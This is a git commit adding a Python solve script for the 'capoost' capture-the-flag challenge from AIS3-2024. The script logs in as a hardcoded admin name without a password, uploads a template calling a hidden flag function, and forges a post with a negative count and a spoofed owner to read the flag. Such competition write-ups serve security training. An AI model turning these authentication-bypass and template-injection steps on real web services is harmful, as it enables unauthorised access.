a0279af06b5d1ac5e35c726efebe1ce7fd9ced1d
Chumy <jimmy012403976@gmail.com>
2024-05-07 22:50:32 +0800

    Add capoost exploit

---
+++ AIS3-2024/capoost/solve/expliot.py
@@ -0,0 +1,26 @@
+import sys
+import requests
+import urllib.parse
+
+if len(sys.argv) <= 1:
+    print(f"usage: {sys.argv[0]} <url>")
+
+admin = '4dm1n1337'
+
+user = 'test'
+passwd = 'test'
+
+getflagfuncname = 'G1V3m34Fl4gpL34s3'
+
+s = requests.session()
+
+s.post(urllib.parse.urljoin(sys.argv[1], 'user/login'), json={'username': admin})
+s.post(urllib.parse.urljoin(sys.argv[1], 'template/upload'), data={'name': 'flag', 'template': '{{ '+getflagfuncname+' }}'})
+s.post(urllib.parse.urljoin(sys.argv[1], 'user/login'), json={'username': user, 'password': passwd})
+s.post(urllib.parse.urljoin(sys.argv[1], 'post/create'), json={'title': 'capoo', 'template': 'capoo', 'data': {'doing1': 'a', 'doing2': 'b'}, 'count': 2})
+s.post(urllib.parse.urljoin(sys.argv[1], 'post/create'), json={'title': 'flag', 'template': 'flag', 'data': {}, 'count': -3, 'owner': admin})
+print(s.get(urllib.parse.urljoin(sys.argv[1], 'post/read'), params={'id': 2}).text)
+
+
+
+
